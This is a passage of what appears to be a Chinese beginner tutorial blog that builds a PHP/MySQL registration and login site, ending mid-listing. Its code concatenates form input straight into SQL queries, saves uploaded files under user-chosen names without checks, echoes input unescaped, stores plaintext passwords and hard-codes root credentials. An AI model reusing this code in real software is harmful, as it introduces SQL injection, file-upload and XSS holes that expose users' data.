&lt;br&gt;</span><br><span class="line">密码：</span><br><span class="line">&lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password1&quot;</span> &gt;&lt;br&gt;</span><br><span class="line">重新输入密码：</span><br><span class="line">&lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password2&quot;</span> &gt;&lt;br&gt;</span><br><span class="line">请输入手机号码：</span><br><span class="line">&lt;input type=<span class="string">&quot;passwrd&quot;</span> name=<span class="string">&quot;shouji&quot;</span> &gt;&lt;br&gt;</span><br><span class="line">上传头像：</span><br><span class="line">&lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;tupian&quot;</span> &gt;&lt;br&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$ERR</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;你注册的用户为：&quot;</span>.<span class="variable">$name</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;你注册的手机号码：&quot;</span>.<span class="variable">$shouji</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;img src=<span class="string">&quot;&lt;?php echo &quot;</span>tupian/<span class="string">&quot;.<span class="subst">$_FILES</span>[&quot;</span>tupian<span class="string">&quot;][&quot;</span>name<span class="string">&quot;]; ?&gt;&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="需求"><a class="header-anchor" href="#需求">¶</a>需求</h4>
+<p>​	1、先判断是否有库，如果没有库就创建</p>
+<p>​	2、判断是否有表，没有表直接创建</p>
+<p>​	3、注册成功后直接将数据插入到表的内容里面</p>
+<h4 id="最后代码"><a class="header-anchor" href="#最后代码">¶</a>最后代码</h4>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// conn.php</span></span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=utf-<span class="number">8</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;kkk&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建连接</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"><span class="variable">$conn2</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 检测连接</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>) &#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;连接失败: &quot;</span> . <span class="title function_ invoke__">mysqli_connect_error</span>());</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">// echo &quot;数据连接成功&lt;/br&gt;&quot;;</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>))&#123;</span><br><span class="line"><span class="comment">// // echo &quot;数据库已经存在&quot;;</span></span><br><span class="line"><span class="comment">// $conn2 = mysqli_connect($servername, $username, $password, $dbname);</span></span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;开始自动创建数据库&lt;/br&gt;&quot;</span>;</span><br><span class="line">	<span class="variable">$sql</span> = <span class="string">&quot;create DATABASE &quot;</span>.<span class="variable">$dbname</span>;</span><br><span class="line">	<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="variable">$sql</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;数据库创建成功&lt;/br&gt;&quot;</span>;</span><br><span class="line">	<span class="variable">$createtbl</span>=<span class="string">&quot;CREATE TABLE IF NOT EXISTS `kkk_tbl`(</span></span><br><span class="line"><span class="string">    `id` INT UNSIGNED AUTO_INCREMENT,</span></span><br><span class="line"><span class="string">    `user` VARCHAR(10) NOT NULL,</span></span><br><span class="line"><span class="string">    `pass` VARCHAR(10) NOT NULL,</span></span><br><span class="line"><span class="string">    `phone` VARCHAR(11) NOT NULL,</span></span><br><span class="line"><span class="string">    `file` VARCHAR(30) ,</span></span><br><span class="line"><span class="string">	PRIMARY KEY ( `id` )</span></span><br><span class="line"><span class="string">) ENGINE=InnoDB DEFAULT CHARSET=utf8;&quot;</span>;</span><br><span class="line">	<span class="variable">$conn2</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line">	<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn2</span>, <span class="variable">$createtbl</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;数据表创建成功&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// mysqli_close($conn);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// mysqli_close($conn);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 最后整合.php</span></span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;conn.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$name</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$password1</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password1&#x27;</span>];</span><br><span class="line"><span class="variable">$password2</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password2&#x27;</span>];</span><br><span class="line"><span class="variable">$shouji</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;shouji&#x27;</span>];</span><br><span class="line"><span class="variable">$tupian</span>=<span class="variable">$_FILES</span>[<span class="string">&#x27;tupian&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$name</span>) &amp;&amp; <span class="keyword">empty</span>(<span class="variable">$password1</span>) &amp;&amp;</span><br><span class="line">		<span class="keyword">empty</span>(<span class="variable">$password2</span>) &amp;&amp; <span class="keyword">empty</span>(<span class="variable">$shouji</span>))&#123;</span><br><span class="line">		<span class="variable">$zhErr</span>=<span class="string">&quot;用户名、密码、手机号码不能为空&quot;</span>;</span><br><span class="line">	&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$password1</span>)&lt;<span class="number">8</span>)&#123;</span><br><span class="line">		<span class="variable">$zhErr</span>=<span class="string">&quot;密码长度必须大于等于8位&quot;</span>;</span><br><span class="line">	&#125; <span class="keyword">elseif</span>(<span class="variable">$password1</span>!=<span class="variable">$password2</span>)&#123;</span><br><span class="line">		<span class="variable">$zhErr</span>=<span class="string">&quot;两次密码不一致&quot;</span>;</span><br><span class="line">	&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$shouji</span>)!=<span class="number">11</span>)&#123;</span><br><span class="line">		<span class="variable">$zhErr</span>=<span class="string">&quot;手机号码不符合规范&quot;</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="comment">//开始处理图片</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;tupian/&quot;</span> . <span class="variable">$tupian</span>[<span class="string">&quot;name&quot;</span>]))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$tupian</span>[<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; 文件已经存在。 &quot;</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="comment">// 如果 upload 目录不存在该文件则将文件上传到 upload 目录下</span></span><br><span class="line">		<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tupian</span>[<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;tupian/&quot;</span> . <span class="variable">$tupian</span>[<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">		<span class="variable">$tupianfile</span>=<span class="variable">$tupian</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;文件存储在:tupian/&quot;</span>.<span class="variable">$tupianfile</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$tupianfile</span>=<span class="variable">$tupian</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">	<span class="variable">$sqlinsert</span>=<span class="string">&quot;</span></span><br><span class="line"><span class="string">	insert into kkk_tbl(user,pass,phone,file)</span></span><br><span class="line"><span class="string">	values(&#x27;<span class="subst">$name</span>&#x27;,&#x27;<span class="subst">$password1</span>&#x27;,&#x27;<span class="subst">$shouji</span>&#x27;,&#x27;<span class="subst">$tupianfile</span>&#x27;);</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">        </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$sqlinsert</span>&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$conn2</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn2</span>, <span class="variable">$sqlinsert</span>))&#123;</span><br><span class="line">		<span class="variable">$zhErr</span>=<span class="string">&quot;注册成功&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$zhErr</span>=<span class="string">&quot;注册失败&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span>method=<span class="string">&quot;post&quot;</span>enctype=<span class="string">&quot;multipart/form-data&quot;</span> &gt;</span><br><span class="line">名字：</span><br><span class="line">&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;name&quot;</span> &gt; &lt;br&gt;</span><br><span class="line">密码：</span><br><span class="line">&lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password1&quot;</span> &gt;&lt;br&gt;</span><br><span class="line">重新输入密码：</span><br><span class="line">&lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password2&quot;</span> &gt;&lt;br&gt;</span><br><span class="line">请输入手机号码：</span><br><span class="line">&lt;input type=<span class="string">&quot;passwrd&quot;</span> name=<span class="string">&quot;shouji&quot;</span> &gt;&lt;br&gt;</span><br><span class="line">上传图像：</span><br><span class="line">&lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;tupian&quot;</span> &gt;&lt;br&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$zhErr</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;img src=<span class="string">&quot;&lt;?php echo &quot;</span>tupian/<span class="string">&quot;.<span class="subst">$_FILES</span>[&quot;</span>tupian<span class="string">&quot;][&quot;</span>name<span class="string">&quot;];?&gt;&quot;</span> alt=<span class="string">&quot;上传的图片&quot;</span> /&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="查询数据"><a class="header-anchor" href="#查询数据">¶</a>查询数据</h4>
+<ul>
+<li>
+<p>SELECT 语句用于从数据表中读取数据:</p>
+<p><code>SELECT column_name(s) FROM table_name</code></p>
+</li>
+</ul>
+<h4 id="PHP联动查询"><a class="header-anchor" href="#PHP联动查询">¶</a>PHP联动查询</h4>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;conn.php&#x27;</span>);</span><br><span class="line"><span class="variable">$chaxun</span>=<span class="string">&quot;select * from kkk_tbl;&quot;</span>;</span><br><span class="line"><span class="variable">$lianjie</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn2</span>,<span class="variable">$chaxun</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// var_dump($lianjie);</span></span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span>=<span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$lianjie</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span>=<span class="variable">$row</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">    <span class="variable">$pass</span>=<span class="variable">$row</span>[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line">    <span class="variable">$phone</span>=<span class="variable">$row</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;user:&quot;</span>.<span class="variable">$user</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>.<span class="string">&quot;pass:&quot;</span>.<span class="variable">$pass</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>.<span class="string">&quot;phone:&quot;</span>.<span class="variable">$phone</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>原始查询代码</li>
+</ul>
+<p><code>select id, username from users where id = 2;</code></p>
+<ul>
+<li>优化后的php代码</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;conn.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$chaxunsql</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;chaxun&#x27;</span>];</span><br><span class="line"><span class="comment">//增加一个判断，判断传入值是数字还是字符串</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$chaxunsql</span>))&#123;</span><br><span class="line">	<span class="variable">$chaxunsql</span>=<span class="string">&quot;id=<span class="subst">$chaxunsql</span>&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$chaxunsql</span>=<span class="string">&quot;username=&#x27;<span class="subst">$chaxunsql</span>&#x27;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$chaxun</span>=<span class="string">&quot;select id,username from users where <span class="subst">$chaxunsql</span> &quot;</span>;</span><br><span class="line"><span class="variable">$reslust</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>,<span class="variable">$chaxun</span>);</span><br><span class="line"><span class="comment">//mysqli_fetch_assoc() 查询数据库结果并且赋值为一行</span></span><br><span class="line">@<span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$reslust</span>);</span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$row</span>[<span class="string">&quot;id&quot;</span>];</span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$row</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line"><span class="comment">//提取row数字中的username字段</span></span><br><span class="line"><span class="variable">$html</span> = <span class="string">&quot;id:<span class="subst">$id</span>&lt;/br&gt;username:<span class="subst">$username</span>&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;mate charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;h1&gt;请输入你要查询的id或者账号名字&lt;/h1&gt;</span><br><span class="line">    </span><br><span class="line">&lt;form action=<span class="string">&quot;#&quot;</span> method=<span class="string">&quot;get&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;chaxun&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> &gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$html</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="例：网站登录注册-登录界面Pro"><a class="header-anchor" href="#例：网站登录注册-登录界面Pro">¶</a>例：网站登录注册+登录界面Pro</h2>
+<ul>
+<li>注：注册界面任务分解，先写出最简单的登录页面，只需要能够判断是否登录成功即可</li>
+<li>结构：
+<ul>
+<li>tupian(文件夹，存放静态资源)</li>
+<li>login.php 登陆界面</li>
+<li>zhuxiao.php  注销界面</li>
+<li>conn.php   数据库连接界面</li>
+<li>zhuce.php   注册界面</li>
+<li>session.php   管理session</li>
+<li>youxi.php    假装后台界面</li>
+</ul>
+</li>
+</ul>
+<h3 id="登录页面login-php"><a class="header-anchor" href="#登录页面login-php">¶</a>登录页面login.php</h3>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;conn.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="variable">$uapsql</span>=<span class="string">&quot;select user,pass from kkk_tbl where user=&#x27;<span class="subst">$username</span>&#x27; and pass=&#x27;<span class="subst">$password</span>&#x27;;&quot;</span>;</span><br><span class="line"><span class="variable">$reslust</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn2</span>,<span class="variable">$uapsql</span>);</span><br><span class="line"><span class="comment">// var_dump($reslust);</span></span><br><span class="line"><span class="comment">// var_dump();</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$reslust</span>))&#123;</span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location:youxi.php&#x27;</span>);</span><br><span class="line">	<span class="title function_ invoke__">session_start</span>();</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]=<span class="string">&#x27;true&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$login</span> = <span class="string">&quot;登录失败&quot;</span>;</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]=<span class="string">&#x27;false&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=utf-<span class="number">8</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">    </span><br><span class="line">&lt;h1&gt;请输入账号以及密码&lt;/h1&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;post&quot;</span> &gt;&lt;/br&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span>&gt; &lt;/br&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password&quot;</span>&gt; &lt;/br&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">    </span><br><span class="line">&lt;a href=<span class="string">&quot;zhuce.php&quot;</span>&gt;点击注册&lt;/a&gt;&lt;/br&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$login</span>;<span class="meta">?&gt;</span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="注销界面zhuxiao-php"><a class="header-anchor" href="#注销界面zhuxiao-php">¶</a>注销界面zhuxiao.php</h3>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&quot;login&quot;</span>]=<span class="string">&#x27;false&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location:login.php&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="数据库连接界面conn-php"><a class="header-anchor" href="#数据库连接界面conn-php">¶</a>数据库连接界面conn.php</h3>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=utf-<span class="number">8</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;kkk&quot;</span>;</span><br><span class="line"><span class="comment">// 创建连接</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"><span class="variable">$conn2</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line"><span class="comment">// 检测连接</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>) &#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;连接失败: &quot;</span> . <span class="title function_ invoke__">mysqli_connect_error</span>());</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">// echo &quot;数据连接成功&lt;/br&gt;&quot;;</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>))&#123;</span><br><span class="line"><span class="comment">// // echo &quot;数据库已经存在&quot;;</span></span><br><span class="line"><span class="comment">// $conn2 = mysqli_connect($servername, $username, $password, $dbname);</span></span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span 